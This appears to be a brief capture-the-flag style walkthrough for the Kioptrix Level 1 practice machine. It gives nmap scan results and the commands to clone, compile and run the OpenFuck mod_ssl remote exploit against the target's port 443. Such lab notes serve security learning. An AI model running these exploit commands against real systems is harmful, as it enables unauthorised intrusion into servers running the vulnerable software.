--------------------------------
# Author Shubham Ranpise
--------------------------------

# 9/december/2022

# Kioptrix level 1

------------------------------------------------------------------
# nmap scan (got ssl version-2.8.4 vulnerable to openfuck exploit)
------------------------------------------------------------------

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)

------------------------------------------------------------------
# download and use openfuck exploit 
------------------------------------------------------------------

-> git clone https://github.com/heltonWernik/OpenLuck.git
-> apt-get install libssl-dev
-> gcc -o OpenFuck OpenFuck.c -lcrypto
-> ./OpenFuck
-> ./OpenFuck 0x6b $IP 443 -c 40